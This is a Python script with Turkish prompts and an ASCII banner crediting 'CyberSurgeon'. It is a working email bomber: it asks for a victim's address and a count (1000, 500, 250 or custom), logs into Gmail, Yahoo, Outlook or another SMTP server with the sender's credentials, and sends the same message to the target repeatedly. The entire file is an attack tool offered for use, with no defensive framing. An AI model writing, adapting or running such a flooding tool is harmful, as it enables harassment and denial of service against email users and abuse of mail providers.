import smtplib
import sys
import time


class yrenk:
    kirmizi='\033[91m'
    yesil='\033[92m'
    sari='\033[93m'
    maviyanarlidönerli='\033[96m'

a=' this string'

def banner():
    print(yrenk.sari+'+[+[+[ Email Bombardımanı ]+]+]+')
    print(yrenk.sari+'+[+[+[ Created by CyberSurgeon ]+]+]+')
    print(yrenk.maviyanarlidönerli+'''
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::                    \|/                    :::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::                  `--+--'                  :::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::                     |                     :::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::                 ,--'#`--.                 :::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::                 |#######|                 :::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::              _.-'#######`-._              :::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::           ,-'###############`-.           :::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::         ,'#####################`,         :::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::        |#####|----Author-----|###|        :::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::       |######| CyberSurgeon  |####|       :::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::      |#######| A.Yasir Altun |#####|      :::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::      |#######|_______________|#####|      ::::::::::::::::::::::::::::::::::::::::::: 
:::::::::::::::::::::::::::::::::::      |#############################|      :::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::       |###########################|       :::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::        \#########################/        :::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::         `.#####################,'         :::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::           `._###############_,'           :::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::              `--..#####..--'              :::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::                                           :::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::'########:'##::::'##::::'###::::'####:'##::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::: ##.....:: ###::'###:::'## ##:::. ##:: ##::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::: ##::::::: ####'####::'##:. ##::: ##:: ##::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::: ######::: ## ### ##:'##:::. ##:: ##:: ##::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::: ##...:::: ##. #: ##: #########:: ##:: ##::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::: ##::::::: ##:.:: ##: ##.... ##:: ##:: ##::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::: ########: ##:::: ##: ##:::: ##:'####: ########:::::::::::::::::::::::::::::::::::::: 
::::::::::::::::::::::::::::::........::..:::::..::..:::::..::....::........::::::::::::::::::::::::::::::::::::::::::::: 
'########:::'#######::'##::::'##:'########:::::'###::::'########::'########::'####:'##::::'##::::'###::::'##::: ##:'####:
 ##.... ##:'##.... ##: ###::'###: ##.... ##:::'## ##::: ##.... ##: ##.... ##:. ##:: ###::'###:::'## ##::: ###:: ##:. ##::
 ##:::: ##: ##:::: ##: ####'####: ##:::: ##::'##:. ##:: ##:::: ##: ##:::: ##:: ##:: ####'####::'##:. ##:: ####: ##:: ##::
 ########:: ##:::: ##: ## ### ##: ########::'##:::. ##: ########:: ##:::: ##:: ##:: ## ### ##:'##:::. ##: ## ## ##:: ##::
 ##.... ##: ##:::: ##: ##. #: ##: ##.... ##: #########: ##.. ##::: ##:::: ##:: ##:: ##. #: ##: #########: ##. ####:: ##::
 ##:::: ##: ##:::: ##: ##:.:: ##: ##:::: ##: ##.... ##: ##::. ##:: ##:::: ##:: ##:: ##:.:: ##: ##.... ##: ##:. ###:: ##::
 ########::. #######:: ##:::: ##: ########:: ##:::: ##: ##:::. ##: ########::'####: ##:::: ##: ##:::: ##: ##::. ##:'####:
........::::.......:::..:::::..::........:::..:::::..::..:::::..::........:::....::..:::::..::..:::::..::..::::..::....::
                   
                     
                                                                  ,-.--.
*.______________________________________________________________,'(Bomb)
                                                                  `--' ''')

class Email_Bomber:
    count=0
    def __init__(self):
        try:
            print( yrenk.maviyanarlidönerli+ '\n+[+[+[ Program Calisiyor ]+]+]+')
            self.target=str(input(yrenk.kirmizi+ 'hedef mail adresini giriniz: '))
            self.mode=int(input(yrenk.kirmizi+'bomba modunu giriniz(1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(Farklı Değer) <: '))
            if  int(self.mode) >int(4)or int(self.mode)<int(1) :
                print('geçersiz bir seçenek girildi, program 5 saniye  sonra kapatılıyor kapatılıyor')
                time.sleep(5)
                sys.exit(1)
        except Exception as e:
            print(f'Hata:{e}')

    def bomb(self):
        try:
            print( yrenk.maviyanarlidönerli+'+[+[+[ Bombayı ayarlayın ]+]+]+')
            self.amount=None
            if self.mode== int(1):
                self.amount=int(1000)
            elif self.mode==int(2):
                self.amount=int(500)
            elif self.mode== int(3):
                self.amount=int(250)
            else:
                self.amount=int(input('gönderilicek mail sayısını giriniz :> '))
            print(yrenk.yesil +f'+[+[+[ Secilen Bomba Modu: {self.mode} ve gonderilicek mail sayisi: {self.amount} ]+]+]+')
        except Exception as e:
            print(f'Hata: {e}')

    def email(self):
        try:
            print(yrenk.maviyanarlidönerli +'\n+[+[+[ Email ayarlama ]+]+]+')
            self.server=str(input(yrenk.sari+'bir mail serveri girin | yada bir bir ayar seçin 1:Gmail 2:Yahoo 3:Outlook :> '))
            ayar= ['1','2','3']
            default_port=True
            if self.server not in ayar:
                default_port= False
                self.port=int(input(yrenk.mavi+'bir port numarası giriniz:> '))
            if default_port == True :
                self.port=int(587)
            if self.server =='1':
                self.server='smtp.gmail.com'
            elif self.server=='2':
                self.server='smtp.mail.yahoo.com'
            elif self.server=='3':
                self.server='smtp-mail.outlook.com'
            self.fromAddr= str(input(yrenk.sari+'hangi mail adresinden gönderilicekse o adresi girin: '))
            self.fromPwd= str(input(yrenk.sari+'hangi mail adresinden gönderilicekse o adresin şifresini girin: '))
            self.subject=str(input(yrenk.sari+'bir konu girin: '))
            self.message=str(input(yrenk.sari+'bir mesaj girin: '))

            self.msg='''From: %s\nTo: %s\nSubject %s\n%s\n
            '''% (self.fromAddr, self.target, self.subject, self.message )

            self.s=smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'Hata: {e}')
    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count += 1
            print(yrenk.sari+f'BOMB: {self.count}')
        except Exception as e:
            print(f'Hata: {e}')
    def attack(self):
        print(yrenk.maviyanarlidönerli +'\n+[+[+[ Saldırılıyor ]+]+]+')
        for email in range (self.amount+1):
            self.send()
        self.s.close()
        print(yrenk.maviyanarlidönerli+'\n+[+[+[ Saldırı Tamamlandı ]+]+]+')
        sys.exit(0)

if __name__=='__main__':
    banner()
    bomb=Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
